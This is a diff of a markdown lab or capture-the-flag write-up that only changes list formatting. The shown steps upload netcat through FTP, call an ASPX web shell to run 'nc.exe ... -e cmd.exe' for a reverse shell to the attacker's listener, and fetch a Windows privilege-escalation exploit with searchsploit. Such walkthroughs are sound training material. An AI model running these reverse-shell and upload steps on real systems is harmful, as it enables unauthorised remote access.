@@ -157,19 +157,19 @@ So how do we get a shell from here?
 We can upload netcat **(nc.exe)**, set up our listener and get a callback. This can be done as follows:
 
 1. copy nc.exe to local dir:
--cp /usr/share/windows-resources/binaries/nc.exe:
+- cp /usr/share/windows-resources/binaries/nc.exe:
     
 2. upload nc.exe to server via FTP
--ftp put nc.exe
+- ftp put nc.exe
         
 3. setup our local machine listener for the call back:
--nc -nlvp 4444
+- nc -nlvp 4444
     
 4. go to $IP/cmdasp.aspx in the browser and find where is located
--dir "\cmdasp.aspx" /s
+- dir "\cmdasp.aspx" /s
 
 5. run nc.exe in browser to initate call back
--c:\inetpub\wwwroot\nc.exe $our_IP 4444 -e cmd.exe
+- c:\inetpub\wwwroot\nc.exe $our_IP 4444 -e cmd.exe
 
 ![2021-02-02 16_49_45-Window.png](/images/2021-02-02 16_49_45-Window.png)
 
@@ -212,7 +212,7 @@ This is on exploit-db so we can find it on our local kali machine using:
 
 It's listed as x86 so let's inspect the code to see if it will run on x64 too...
 
-- searchsploit -m windows_x86/local/40564.c
+	searchsploit -m windows_x86/local/40564.c
 
 Some things to note:
 
